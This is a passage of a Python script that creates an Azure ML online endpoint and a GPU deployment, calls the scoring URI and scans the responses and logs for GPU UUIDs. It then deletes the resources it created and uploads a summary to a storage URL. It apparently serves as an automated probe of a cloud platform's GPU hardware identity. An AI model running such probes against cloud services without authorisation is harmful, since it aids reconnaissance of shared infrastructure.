                (wsu + "/environments/" + ENVNAME + "/versions/1")
            break
    emit({"step": "env-final", "ok": bool(env_ver)})
    summary["env"] = {"id_ok": bool(env_ver)}

    eurl = wsu + "/onlineEndpoints/" + ENDPOINT + "?api-version=" + API_W
    st, eb = arm(tok, eurl, "PUT", {"location": loc, "tags": {"c211": NONCE},
                                    "identity": {"type": "SystemAssigned"},
                                    "properties": {"authMode": "Key",
                                                   "description": "c211 i125197 nonce"}},
                 timeout=180)
    emit({"step": "endpoint-create", **err_of(st, eb)})
    ep_state = None
    if st in (200, 201, 202):
        own["ep"] = ENDPOINT
        t0 = time.time()
        while time.time() - t0 < 420:
            rst, rb = arm(tok, eurl, timeout=90)
            ep_state = prov_state(rb)
            emit({"step": "endpoint-poll", "http": rst, "state": ep_state,
                  "t": round(time.time() - t0),
                  "scoring_uri": ((rb.get("properties") or {}).get("scoringUri")
                                  if isinstance(rb, dict) else None)})
            if ep_state in ("Succeeded", "Failed", "Canceled"):
                break
            time.sleep(12)
    summary["endpoint"] = {"state": ep_state}
    if ep_state == "Succeeded":
        stk0, kb0 = arm(tok, eurl + "/listKeys?api-version=" + API_W, "POST", {},
                        timeout=90)
        emit({"step": "endpoint-listkeys", "http": stk0,
              "key_names": (sorted(kb0.keys())[:8] if isinstance(kb0, dict) else None)})
        summary["endpoint"]["listKeys_http"] = stk0
    if ep_state != "Succeeded":
        emit({"step": "ABORT", "why": "endpoint not created", "state": ep_state})
        teardown(tok, sid, base, rbase, own, summary)
        return

    # SKU ladder inside the workspace region, gated on the decoded online quota
    sku_ladder = []
    if qfree(loc, r"a100|nc24") >= 24:
        sku_ladder.append({"region": loc, "sku": "Standard_NC24ads_A100_v4",
                           "why": "a100 family free"})
    if qfree(loc, r"ncas|nc4as|nc8as|t4") >= 4:
        sku_ladder.append({"region": loc, "sku": "Standard_NC4as_T4_v3",
                           "why": "t4 family free"})
    if not sku_ladder:
        sku_ladder = [{"region": loc, "sku": "Standard_NC4as_T4_v3",
                       "why": "fallback-undecoded-quota"},
                      {"region": loc, "sku": "Standard_NC24ads_A100_v4",
                       "why": "fallback-point"}]
    sku_ladder = sku_ladder[:2]
    summary["sku_ladder"] = sku_ladder
    emit({"step": "sku-ladder", "ladder": sku_ladder})

    durl = wsu + "/onlineEndpoints/" + ENDPOINT + "/deployments/" + DEPLOYMENT + \
        "?api-version=" + API_W
    dep_state = None
    dep_tries = []
    score_out = None
    for attempt in sku_ladder:
        if left() < 300:
            break
        dbody = {"location": loc, "tags": {"c211": NONCE},
                 "sku": {"name": attempt["sku"], "capacity": 1},
                 "properties": {
                     "endpointComputeType": "Managed",
                     "instanceType": attempt["sku"],
                     "instanceCount": 1,
                     "environmentId": env_ver,
                     "environmentVariables": {"C211_NONCE": NONCE},
                     "appInsightsEnabled": False,
                     "requestSettings": {"requestTimeoutMillis": 90000,
                                         "maxConcurrentRequestsPerInstance": 1},
                     "livenessProbe": {"initialDelay": "PT300S",
                                       "period": "PT30S", "timeout": "PT30S",
                                       "failureThreshold": 30, "successThreshold": 1},
                     "readinessProbe": {"initialDelay": "PT300S",
                                        "period": "PT30S", "timeout": "PT30S",
                                        "failureThreshold": 30, "successThreshold": 1}}}
        dbody["properties"]["codeConfiguration"] = {
            "codeId": code_id, "scoringScript": "score.py"}
        st, db = arm(tok, durl, "PUT", dbody, timeout=300)
        emit({"step": "dep-create", "sku": attempt["sku"], "region": attempt["region"],
              "sku_body": dbody["sku"], **err_of(st, db),
              "body": json.dumps(db)[:1200]})
        dep_tries.append({"sku": attempt["sku"], "http": st,
                          "err": (None if st in (200, 201, 202) else err_of(st, db))})
        if st in (200, 201, 202):
            own["dep"] = DEPLOYMENT
            t0 = time.time()
            while time.time() - t0 < 2400:
                time.sleep(20)
                rst, rb = arm(tok, durl, timeout=120)
                dep_state = prov_state(rb)
                rp = (rb.get("properties") or {}) if isinstance(rb, dict) else {}
                emit({"step": "dep-poll", "http": rst, "state": dep_state,
                      "t": round(time.time() - t0),
                      "provisioning": rp.get("provisioningState"),
                      "error": (json.dumps(rp.get("error"))[:400]
                                if rp.get("error") else None)})
                if dep_state in ("Succeeded", "Failed", "Canceled"):
                    break
            break
    summary["deployment"] = {"state": dep_state, "tries": dep_tries}
    emit({"step": "dep-final", "state": dep_state})

    # ---------- G. scoring URI + key + POST ----------
    if dep_state == "Succeeded":
        st, rb = arm(tok, eurl, timeout=90)
        rp = (rb.get("properties") or {}) if isinstance(rb, dict) else {}
        scoring = rp.get("scoringUri")
        stk, kb = arm(tok, eurl + "/listKeys?api-version=" + API_W, "POST", {}, timeout=90)
        key = None
        for k in ("PrimaryKey", "primaryKey", "PrimaryKeySecondary", "primary_key"):
            if isinstance(kb, dict) and kb.get(k):
                key = kb[k]
                break
        emit({"step": "score-endpoint", "http": st, "scoring_uri": scoring,
              "keys_http": stk, "key_ok": bool(key),
              "key_names": (list(kb.keys())[:8] if isinstance(kb, dict) else None)})
        summary["endpoint"].update({"scoring_uri": scoring, "keys_http": stk,
                                    "key_ok": bool(key)})
        if scoring and key:
            payload = json.dumps({"input_data": {"x": NONCE}}).encode()
            t0 = time.time()
            last = None
            while time.time() - t0 < 900:
                sc, sb = httptext(scoring, method="POST", body=payload, headers={
                    "Authorization": "Bearer " + key,
                    "Content-Type": "application/json"}, timeout=150)
                txt = sb.decode("utf-8", "replace")
                last = {"http": sc, "len": len(txt)}
                emit({"step": "score", "http": sc, "len": len(txt),
                      "has_uuid": bool(re.search(r"GPU-[0-9a-fA-F-]{16,}", txt)),
                      "body": txt[:1600], "t": round(time.time() - t0)})
                if sc == 200 and re.search(r"GPU-[0-9a-fA-F-]{16,}", txt):
                    score_out = txt
                    break
                if sc in (200, 400, 401, 403) and re.search(r"GPU-", txt):
                    score_out = txt
                    break
                time.sleep(20)
            summary["score"] = last or {}
            if score_out:
                summary["score"]["body"] = score_out[:4000]
    else:
        # capture deployment logs verbatim even on failure (container stdout)
        st, lg = arm(tok, wsu + "/onlineEndpoints/" + ENDPOINT + "/deployments/" +
                     DEPLOYMENT + "/logs?api-version=" + API_W, timeout=120)
        body = ""
        if isinstance(lg, dict):
            body = json.dumps(lg)[:3000]
        elif isinstance(lg, (bytes, str)):
            body = str(lg)[:3000]
        emit({"step": "dep-logs", "http": st, "body": body[:2500]})

    # ---------- H. independent readback ----------
    st_d, db2 = arm(tok, durl, timeout=120)
    rp2 = (db2.get("properties") or {}) if isinstance(db2, dict) else {}
    st_e, eb2 = arm(tok, eurl, timeout=90)
    rp3 = (eb2.get("properties") or {}) if isinstance(eb2, dict) else {}
    st_l, lb2 = arm(tok, wsu + "/onlineEndpoints/" + ENDPOINT + "/deployments"
                    "?api-version=" + API_W, timeout=90)
    inst = None
    try:
        inst = [{"name": x.get("name"),
                 "instanceType": ((x.get("properties") or {}).get("instanceType")),
                 "state": ((x.get("properties") or {}).get("provisioningState"))}
                for x in ((lb2.get("value") or []) if isinstance(lb2, dict) else [])]
    except Exception:  # noqa: BLE001
        pass
    summary["readback"] = {
        "deployment_http": st_d, "deployment_state": rp2.get("provisioningState"),
        "deployment_instanceType": rp2.get("instanceType"),
        "deployment_instanceCount": rp2.get("instanceCount"),
        "endpoint_http": st_e, "endpoint_state": rp3.get("provisioningState"),
        "endpoint_scoringUri_present": bool(rp3.get("scoringUri")),
        "deployments_list_http": st_l, "deployments": inst}
    emit({"step": "readback", **{k: v for k, v in summary["readback"].items()
                                 if k != "deployments"},
          "deployments": inst})
    st, lg = arm(tok, wsu + "/onlineEndpoints/" + ENDPOINT + "/deployments/" +
                 DEPLOYMENT + "/logs?api-version=" + API_W, timeout=120)
    lgtext = ""
    if isinstance(lg, dict):
        lgtext = json.dumps(lg)
        for k in ("content", "log", "text", "raw"):
            if isinstance(lg.get(k), str) and len(lg[k]) > len(lgtext) // 3:
                lgtext = lg[k]
    elif isinstance(lg, (bytes, str)):
        lgtext = str(lg)
    uu = re.findall(r"GPU-[0-9a-fA-F-]{16,}", lgtext)
    emit({"step": "dep-logs", "http": st, "len": len(lgtext),
          "uuids": sorted(set(uu))[:16],
          "head": lgtext[:2200], "tail": lgtext[-1400:]})
    summary["dep_logs"] = {"http": st, "len": len(lgtext),
                           "uuids": sorted(set(uu)),
                           "excerpt": lgtext[:6000]}

    # ---------- I. teardown ----------
    teardown(tok, sid, base, rbase, own, summary)


def left():
    return DEADLINE - (time.time() - T0)


def del_and_wait(url, label, budget, summary):
    st, b = arm(TOK_G, url, "DELETE", None, timeout=180)
    emit({"step": "delete", "label": label, "http": st,
          "code": (b.get("error", {}) or {}).get("code") if isinstance(b, dict) else None})
    t0 = time.time()
    final = st
    while time.time() - t0 < budget:
        time.sleep(10)
        st2, b2 = arm(TOK_G, url, "GET", None, timeout=90)
        final = st2
        if st2 == 404:
            break
    summary["cleanup"][label] = {"delete_http": st, "final_get_http": final,
                                 "t": round(time.time() - t0)}
    emit({"step": "delete-readback", "label": label, "final": final,
          "t": round(time.time() - t0)})
    return final


TOK_G = None
GTOK = None
GSID = None
GBASE = None
GRBASE = None
GOWN = {}


def teardown(tok, sid, base, rbase, own, summary):
    global TOK_G
    TOK_G = tok
    t0 = time.time()
    if own.get("dep"):
        del_and_wait(base + "/Microsoft.MachineLearningServices/workspaces/" + WS +
                     "/onlineEndpoints/" + ENDPOINT + "/deployments/" + DEPLOYMENT +
                     "?api-version=" + API_W, "deployment", 600, summary)
    if own.get("ep"):
        del_and_wait(base + "/Microsoft.MachineLearningServices/workspaces/" + WS +
                     "/onlineEndpoints/" + ENDPOINT + "?api-version=" + API_W,
                     "endpoint", 600, summary)
        st, lb = arm(tok, base + "/Microsoft.MachineLearningServices/workspaces/" + WS +
                     "/onlineEndpoints?api-version=" + API_W, timeout=90)
        names = [x.get("name") for x in ((lb.get("value") or [])
                                         if isinstance(lb, dict) else [])]
        summary["cleanup"]["onlineEndpoints_list_after"] = {"http": st, "names": names}
        emit({"step": "ep-list-after", "http": st, "names": names})
    if own.get("ws"):
        wsfinal = del_and_wait(
            base + "/Microsoft.MachineLearningServices/workspaces/" + WS +
            "?api-version=" + API_W, "workspace", 900, summary)
        wtries = 1
        while wsfinal != 404 and wtries < 6:
            wtries += 1
            time.sleep(30)
            wsfinal = del_and_wait(
                base + "/Microsoft.MachineLearningServices/workspaces/" + WS +
                "?api-version=" + API_W, "workspace-retry-%d" % wtries, 600, summary)
        summary["cleanup"]["workspace_final"] = wsfinal
        emit({"step": "workspace-final", "final": wsfinal, "tries": wtries})
    if own.get("kv"):
        del_and_wait(base + "/Microsoft.KeyVault/vaults/" + own["kv"] +
                     "?api-version=" + REG_VER, "kv", 300, summary)
    if own.get("sa"):
        del_and_wait(base + "/Microsoft.Storage/storageAccounts/" + own["sa"] +
                     "?api-version=" + STG_VER, "sa", 400, summary)
    st, rl = arm(tok, ARM + "/subscriptions/" + sid + "/resourceGroups/" + RG +
                 "/resources?api-version=2021-04-01")
    mine = [{"name": x.get("name"), "type": x.get("type")}
            for x in ((rl.get("value") or []) if isinstance(rl, dict) else [])
            if str(x.get("name", "")).lower().startswith("c211")]
    summary["cleanup"]["rg_inventory_c211"] = mine
    emit({"step": "rg-inventory-final", "http": st, "c211": mine})
    summary["elapsed"] = round(time.time() - T0, 1)
    try:
        if GOWN.get("out_sas_url"):
            payload = json.dumps(summary, default=str).encode()
            rc, _rb = httptext(GOWN["out_sas_url"], method="PUT", body=payload,
                               headers={"x-ms-blob-type": "BlockBlob",
                                        "Content-Type": "application/json"},
                               timeout=120)
            emit({"step": "summary-upload", "http": rc, "len": len(payload)})
    except Exception as e:  # noqa: BLE001
        emit({"step": "summary-upload", "err": str(e)})
    emit({"step": "SUMMARY", "summary": summary})
    emit({"step": "PROBE-EXIT", "code": 0})


if __name__ == "__main__":
    main()
